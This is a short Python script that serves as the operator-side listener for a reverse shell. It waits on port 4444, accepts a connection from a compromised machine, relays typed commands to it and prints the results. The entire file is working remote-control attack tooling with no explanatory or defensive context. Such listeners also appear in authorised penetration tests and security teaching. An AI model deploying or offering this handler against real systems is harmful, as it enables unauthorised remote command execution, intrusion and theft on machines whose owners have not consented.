import socket

def handle_client(conn, addr):
    print(f"[+] Connection from {addr}")
    conn.send(b"Connected to reverse shell.\n")

    while True:
        cmd = input("shell> ")

        if not cmd.strip():
            continue

        conn.send(cmd.encode() + b"\n")

        if cmd.lower() == "exit":
            print("[*] Closing connection.")
            conn.close()
            break

        data = conn.recv(4096)
        if not data:
            print("[!] Client disconnected.")
            break

        print(data.decode(errors="ignore"), end="")

def main():
    host = "0.0.0.0"
    port = 4444

    server = socket.socket()
    server.bind((host, port))
    server.listen(1)

    print(f"[+] Listening on {host}:{port} ...")
    conn, addr = server.accept()
    handle_client(conn, addr)

if __name__ == "__main__":
    main()
